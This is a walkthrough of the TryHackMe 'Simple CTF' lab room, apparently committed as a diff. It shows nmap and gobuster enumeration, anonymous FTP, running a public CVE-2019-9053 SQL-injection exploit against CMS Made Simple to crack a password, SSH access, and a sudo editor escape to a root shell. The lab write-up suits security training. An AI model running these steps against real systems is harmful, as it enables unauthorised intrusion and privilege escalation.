@@ -1,0 +1,136 @@
+A walkthrough of the Simple CTF room on TryHackMe
+
+Created by MrSeth6797
+
+Completed using a kali vm using openvpn to connect to THM's server
+
+Published for educational support and the development of skills in web app enumeration, exploitation and privilege escalation
+
+Never attempt to replicate these techniques on machines without explicit consent 
+
+WALKTHROUGH
+
+Begin reconnaissance with nmap scan, first two flags obtained
+Note that anonymous ftp access is allowed
+  ─$ nmap -sV -sC -A -T4 --min-rate=5000 <TARGETIP> 
+  ...
+  PORT     STATE SERVICE VERSION
+  21/tcp   open  ftp     vsftpd 3.0.3
+  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  ...
+  | ftp-syst: 
+  ...
+  80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+  | http-robots.txt: 2 disallowed entries 
+  |_/ /openemr-5_0_1_3 
+  |_http-title: Apache2 Ubuntu Default Page: It works
+  |_http-server-header: Apache/2.4.18 (Ubuntu)
+  2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+  ...
+  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Connect to machine, find file indicating a dev has a weak password
+  ─$ ftp <TARGETIP>     
+  Connected to <TARGETIP>.
+  220 (vsFTPd 3.0.3)
+  Name (<TARGETIP>:kali): anonymous
+  230 Login successful.
+  Remote system type is UNIX.
+  Using binary mode to transfer files.
+  ftp> ls
+  229 Entering Extended Passive Mode (|||40579|)
+  ftp: Can't connect to `<TARGETIP>:40579': Connection timed out
+  200 EPRT command successful. Consider using EPSV.
+  150 Here comes the directory listing.
+  drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
+  226 Directory send OK.
+  ftp> cd pub
+  250 Directory successfully changed.
+  ftp> ls
+  200 EPRT command successful. Consider using EPSV.
+  150 Here comes the directory listing.
+  -rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
+  226 Directory send OK.
+  ftp> get ForMitch.txt
+  local: ForMitch.txt remote: ForMitch.txt
+  200 EPRT command successful. Consider using EPSV.
+  150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
+  100% |********************************|   166      279.01 KiB/s    00:00 ETA
+  226 Transfer complete.
+  166 bytes received in 00:00 (0.61 KiB/s)
+
+Access web page via browser
+  Not much to see, standard apache is working page
+  A robots.txt file
+
+Use gobuster to enumerate http page for hidden directories
+  └─$ gobuster dir -u <TARGETIP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+  ...
+  /simple               (Status: 301) [Size: 313] [--> http://<TARGETIP>/simple/]
+
+Access http://<TARGETIP>/simple
+  ID there is a login page linked
+  Specific version of CMS listed in lower left section of page
+    CMS Made Simple version 2.2.8
+
+Search for CMS Made Simple version 2.2.8 CVE
+  [flag]
+Find script for exploit 
+  https://www.exploit-db.com/exploits/46635
+    [flag listed in title - initialise for submission on thm]
+Download exploit
+  Also available with corrected print syntax 
+    https://github.com/Mahamedm/CVE-2019-9053-Exploit-Python-3/tree/main
+Let run
+  └─$ python csmmssqli.py -u http://<TARGETIP>/simple -c -w /usr/share/wordlists/rockyou.txt
+
+  [+] Salt for password found: 1dac0d92e9fa6bb2
+  [+] Username found: mitch
+  [+] Email found: a8
+  [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+  [+] Password cracked: [flag]
+
+Use ssh to connect to target
+  ─$ ssh mitch@<TARGETIP> -p 2222
+  mitch@<TARGETIP>'s password: 
+  Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+Verify id and view directory contents
+  $ whoami
+  mitch
+  $ ls -la
+  total 36
+  ...
+  -rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
+  -rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
+  -rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
+  $ cat user.txt  
+  [flag]
+
+Navigate back to home directory and enumerate additional user on system
+  [flag]
+
+Check sudo privileges
+  $ sudo -l
+  User mitch may run the following commands on Machine:
+      (root) NOPASSWD: /usr/bin/[flag]
+
+Check options for using [flag]
+  a text editor that can be used to create scripts and execute commands
+      https://www.techtarget.com/searchdatacenter/tutorial/How-to-use-Vim-in-Linux
+  with mitch's sudo privileges we can run a command to spawn a new shell as root
+    https://gtfobins.github.io/gtfobins/[flag]/
+      sudo [flag] -c ':!/bin/sh'
+
+Root access achieved! 
+
+Navigate to /root and retrieve the final flag!
+
+     
+
+
+
+
+
+
+  
